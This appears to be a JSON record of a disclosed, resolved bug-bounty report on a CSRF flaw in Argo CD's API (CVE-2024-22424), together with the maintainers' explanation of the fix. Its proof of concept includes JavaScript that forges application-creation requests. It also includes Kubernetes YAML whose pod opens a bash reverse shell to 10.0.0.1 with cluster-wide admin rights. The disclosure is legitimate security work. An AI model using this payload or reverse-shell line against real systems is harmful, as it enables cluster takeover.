{
  "id": 2326194,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzI2MTk0",
  "url": "https://hackerone.com/reports/2326194",
  "title": "Argo CD CSRF leads to Kubernetes cluster compromise",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2024-01-19T08:16:13.566Z",
  "submitted_at": "2024-01-19T08:16:14.091Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tint0",
    "url": "/tint0",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/11oe8ze9y2gqiw9tbw4xc37z3f1m/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXZZIVV5J%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T192809Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJIMEYCIQCGlC8uuhaOQu0Bap1hI1S9LUjZl%2FWt75i7wEZd0I8kOgIhAPo2QLbtQ3igMd6c6EP6S0vN%2FAnoC7v3%2BAqb0pGpgtnpKroFCPH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwYr8Z15bn0jLVYw20qjgX0tUaxf7N5SGMOiPoF5MkNNn0U7siBo5bf%2BgOeBZChN7zOZdu%2Frc3P25xknDOoE91MLQsgw8F%2FfkuUpdQ4YTDG9dB5O%2FrUrc1kzotpF3gI2euR3ejFd%2Fm%2BoAYx5bz04W4IU0vG9x2q6PO9eHyoYNI81dxlrv%2FFDQx4pfjcnAHNE%2FIfKBGhPHHMdtNwrNZN1GHlC1wIMNP%2FIaivLVoLcYmDd1DyGOTuE6SmACbTNdemxkNvehZ6xofkgYXRhe8ZfmKdWH3I7gd7ym1BQGXP6Y2bTDUEajNzgy%2F0wExsT%2Fhmwz34S%2FklOmAVPN%2F3cE6HPqSPBK9tcVYrCTpsz%2BPDjbsINBQ34X0hnNE9p3I%2FFvNYjBYNiKqSWRVbvL4PGyavgSrKQe2nlqkQDZcjizaqfXtgcRQdfKmgemPMbxaNawS6MW%2B%2BP%2FjJJtcdfYNdU9yc8F3yhz9zMMaGOnhtbYhl125jC6TEDYkVh9z8BeaazQkb7FV428OJ5QHueDqEY7PxXjx4lRzno2FmpzbHPXasyxEPUv5ICnPSFEdpBV57Z%2BnWV8iVTbY2RZDXCM%2BYaTr00GkQZqw9fQhw4ezg5Rj5oc0hLBlFyPAavVuNvRzO8qcpGgUzwag7FHaLZArx7ldluBJFsegf92xG9h584t8rB8x4IWPzeYuCVQmaexNIUWVsFITCr4bB4GXkj1P3RFCugnenvsalBaygka%2BovQDmg7hjCPZ4hq%2B6NMODPUdiaNTSiWcIWzxgeWSfK5A%2BTele7QZza6Hfd3xq%2BxKKT7VdHnqijgNcO1IwspZJlSQ0RwKe8MEb6DdYgXzwmN6x7MDls4sxxncNO5anKsPtZycO8uPUVGUy9im7moXLXv7sihIwipm7xgY6sAEI6lWkpv%2Fc0YxVCdMv7xegG1otzjYOVvYUxeJK3s4XgvvDpBlpCb%2FjuybYOC2l%2FI6aUBId3OlOVo9IpXE5aRgCaHiM1KtThZsPspmi0XujqT4Ou0wHvvaZDPvHDk%2BxE77XeD5T%2FeLtJdXdxp%2BEplWfSmpcYM5iMlQhrox03H6YSXOZ0YY4u5%2Ba7wLkBh0KxQrtZ1q99eY8%2BQ2NBb6eQjvbDXDETMy1DWq8sGRZ%2FmfIWQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0dd03703d06543ece98cde60d3fee9cd247ee6b4c3c8675b9b8c382a83f84310",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXZZIVV5J%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T192809Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJIMEYCIQCGlC8uuhaOQu0Bap1hI1S9LUjZl%2FWt75i7wEZd0I8kOgIhAPo2QLbtQ3igMd6c6EP6S0vN%2FAnoC7v3%2BAqb0pGpgtnpKroFCPH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwYr8Z15bn0jLVYw20qjgX0tUaxf7N5SGMOiPoF5MkNNn0U7siBo5bf%2BgOeBZChN7zOZdu%2Frc3P25xknDOoE91MLQsgw8F%2FfkuUpdQ4YTDG9dB5O%2FrUrc1kzotpF3gI2euR3ejFd%2Fm%2BoAYx5bz04W4IU0vG9x2q6PO9eHyoYNI81dxlrv%2FFDQx4pfjcnAHNE%2FIfKBGhPHHMdtNwrNZN1GHlC1wIMNP%2FIaivLVoLcYmDd1DyGOTuE6SmACbTNdemxkNvehZ6xofkgYXRhe8ZfmKdWH3I7gd7ym1BQGXP6Y2bTDUEajNzgy%2F0wExsT%2Fhmwz34S%2FklOmAVPN%2F3cE6HPqSPBK9tcVYrCTpsz%2BPDjbsINBQ34X0hnNE9p3I%2FFvNYjBYNiKqSWRVbvL4PGyavgSrKQe2nlqkQDZcjizaqfXtgcRQdfKmgemPMbxaNawS6MW%2B%2BP%2FjJJtcdfYNdU9yc8F3yhz9zMMaGOnhtbYhl125jC6TEDYkVh9z8BeaazQkb7FV428OJ5QHueDqEY7PxXjx4lRzno2FmpzbHPXasyxEPUv5ICnPSFEdpBV57Z%2BnWV8iVTbY2RZDXCM%2BYaTr00GkQZqw9fQhw4ezg5Rj5oc0hLBlFyPAavVuNvRzO8qcpGgUzwag7FHaLZArx7ldluBJFsegf92xG9h584t8rB8x4IWPzeYuCVQmaexNIUWVsFITCr4bB4GXkj1P3RFCugnenvsalBaygka%2BovQDmg7hjCPZ4hq%2B6NMODPUdiaNTSiWcIWzxgeWSfK5A%2BTele7QZza6Hfd3xq%2BxKKT7VdHnqijgNcO1IwspZJlSQ0RwKe8MEb6DdYgXzwmN6x7MDls4sxxncNO5anKsPtZycO8uPUVGUy9im7moXLXv7sihIwipm7xgY6sAEI6lWkpv%2Fc0YxVCdMv7xegG1otzjYOVvYUxeJK3s4XgvvDpBlpCb%2FjuybYOC2l%2FI6aUBId3OlOVo9IpXE5aRgCaHiM1KtThZsPspmi0XujqT4Ou0wHvvaZDPvHDk%2BxE77XeD5T%2FeLtJdXdxp%2BEplWfSmpcYM5iMlQhrox03H6YSXOZ0YY4u5%2Ba7wLkBh0KxQrtZ1q99eY8%2BQ2NBb6eQjvbDXDETMy1DWq8sGRZ%2FmfIWQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7828d0559ff9ed37938712e6355bc478765853ffc08adb745980a9ed41d5dbca"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-01-29T18:03:05.777Z",
  "bug_reporter_agreed_on_going_public_at": "2024-01-29T18:03:05.632Z",
  "team_member_agreed_on_going_public_at": "2024-01-29T15:32:33.105Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "GHSA: https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\n\nIt's been publicly known for years that all of Argo CD API is vulnerable to Cross-Site Request Forgery (CSRF). We assume the team haven't made it a priority because of the lack of evidence to support it's a severe vulnerability.\n\nModern browsers implement the Lax SameSite cookie attribute to prevent CSRF, but it is not foolproof. The samesite attribute is rendered useless if the origin is on the same parent domain as the target.\n\nWe spin up a sample environment with Argo CD v2.8.2 to test this. An attacker controls contents of ​​marketing.victim.com (via Stored XSS, for example) and wants to target argocd.internal.victim.com.\n\nThe following proof of concept allows the attacker to create a pod with admin privileges on the Kubernetes cluster via Argo CD. This piece of JavaScript is injected on the ​​marketing.victim.com homepage:\n```\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications');\nxhr.setRequestHeader('Content-Type', 'text/plain')\nxhr.withCredentials = true;\nxhr.send('{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\",\"metadata\":{\"name\":\"test-app1\"},\"spec\":{\"destination\":{\"name\":\"\",\"namespace\":\"default\",\"server\":\"https://kubernetes.default.svc\"},\"source\":{\"path\":\"argotest1\",\"repoURL\":\"https://github.com/califio/argotest1\",\"targetRevision\":\"HEAD\"},\"sources\":[],\"project\":\"default\",\"syncPolicy\":{\"automated\":{\"prune\":false,\"selfHeal\":false}}}}')\n```\nWhere repoURL points to a repository with the yaml definition like:\n```\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: my-sa\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: my-pod\nspec:\n  serviceAccountName: my-sa\n  containers:\n  - name: ubuntu\n    image: ubuntu:latest\n    command: [\"bash\", \"-c\", \"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: my-role\nrules:\n- apiGroups: [\"\"]\n  resources: [\"*\"]\n  verbs: [\"*\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: my-rolebinding\nsubjects:\n- kind: ServiceAccount\n  name: my-sa\n  namespace: default\nroleRef:\n  kind: ClusterRole\n  name: my-role\n  apiGroup: rbac.authorization.k8s.io\n```\nThen wait. An employee logged-in to argocd.internal.victim.com, when visiting marketing.victim.com, will lead to Kubernetes cluster compromise.\n\nThis is made possible because:\n- Argo CD does not respect the Content-Type header. If it did, the request would have triggered a preflight CORS request on \"application/json\" CT and the attack fails.\n- The attacker needs zero knowledge to craft a valid json. The cluster location, project name… are available by default.\n\n## Impact\n\nKubernetes cluster compromise",
  "bounty_amount": "4660.0",
  "formatted_bounty": "$4,660",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-02-28T15:32:33.212Z",
  "allow_singular_disclosure_after": -49262136.80185293,
  "singular_disclosure_allowed": true,
  "vote_count": 32,
  "voters": [
    "k0ns0l",
    "n1m0",
    "exec_iq",
    "thaivu",
    "twelvesix",
    "zy9ard3",
    "0xd0ff9",
    "nhienit2010",
    "giongfnef",
    "tuo4n8",
    "and 22 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 154298,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/argoproj/argoproj",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 397939,
      "category": "team",
      "content": "Cross-Site Request Forgery (CSRF) in github.com/argoproj/argo-cd \nCVE-2024-22424\nSeverity: High\n\nImpact\nThe Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD.\n\nA CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim’s behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code.\n\nArgo CD uses the “Lax” SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request.\n\nMany companies host Argo CD on an internal subdomain, such as https:// argo-cd.internal.example.com. If an attacker can place malicious code on, for example, https:// test.internal.example.com/, they can still perform a CSRF attack. In this case, the “Lax” SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API.\n\nBrowsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a “preflight request” for POSTs with content type “application/json” asking the destination API “are you allowed to accept requests from my domain?” If the destination API does not answer “yes,” the browser will block the request.\n\nBefore the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser’s CORS check by setting the content type to something which is considered “not sensitive” such as “text/plain.” The browser wouldn’t send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code).\n\nFull GHSA: https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg",
      "updated_at": "2024-01-29T15:29:35.839Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 904892,
        "username": "kunderkoffler",
        "name": "Kayla Underkoffler",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2020-01-13T19:26:22.339Z",
        "url": "https://hackerone.com/kunderkoffler",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "id": 398039,
      "category": "researcher",
      "content": "https://blog.calif.io/p/argo-cd-csrf",
      "updated_at": "2024-01-29T18:02:57.023Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 132940,
        "username": "tint0",
        "name": "An Trinh",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://calif.io",
        "location": "",
        "created_at": "2016-12-27T16:22:23.343Z",
        "url": "https://hackerone.com/tint0",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/11oe8ze9y2gqiw9tbw4xc37z3f1m/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/11oe8ze9y2gqiw9tbw4xc37z3f1m/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MzkzMTE0MiwicHVyIjoiYmxvYl9pZCJ9fQ==--357b235bb10b53eb429939b4d869e54f80ac231c/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplIjoiMjYweDI2MFx1MDAzZSJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--cea846659d6dfdc215f3c0fb14f7ed8ebc9f95ef/IMG_3941%20(6).jpeg"
        }
      }
    }
  ]
}
